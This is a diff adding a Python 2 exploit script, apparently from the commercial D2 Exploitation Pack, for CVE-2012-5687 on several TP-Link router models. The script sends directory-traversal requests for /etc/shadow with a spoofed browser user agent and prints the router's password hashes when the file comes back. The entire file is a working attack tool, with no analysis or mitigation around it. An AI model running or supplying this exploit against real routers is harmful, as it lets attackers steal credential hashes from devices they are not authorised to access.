@@ -1,0 +1,53 @@
+#! /usr/bin/env python2
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2013
+#
+
+###
+# STD modules
+###
+import os, sys, re
+import cStringIO
+try:
+  import pycurl
+except:
+  print 'No module pycurl'
+
+_name_   = 'd2sec_tplink_1'
+_vendor_ = 'tp-link'
+_model_  = ['TL-WR841N', 'TL-WA701N', 'TL-WA701ND']
+_vuln_   = 'Local file include'
+_cve_    = 'CVE-2012-5687'
+_ref_    = ''
+_port_   = 80
+
+uri = ['help/../../../../../../../../etc/shadow',
+  '../../../../../../../../etc/shadow']
+
+def pwnrouter(host):
+  for u in uri:
+    try:
+      nfo = cStringIO.StringIO()
+      c = pycurl.Curl()
+      c.setopt(pycurl.URL, 'http://%s/%s' % (host,u))
+      c.setopt(pycurl.USERAGENT, 'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.1)')
+      c.setopt(pycurl.WRITEFUNCTION, nfo.write)
+      c.perform()
+    except Exception, e:
+      print '[-] error : %s' % e
+      return
+    data = nfo.getvalue()
+    if 'root:' in data:
+      print '[+] %s vulnerable:' % host
+      print data
+      return
+    c.close()
+  print '[+] %s not vulnerable' % host
+
+if __name__ == "__main__":
+  pwnrouter(sys.argv[1])
+
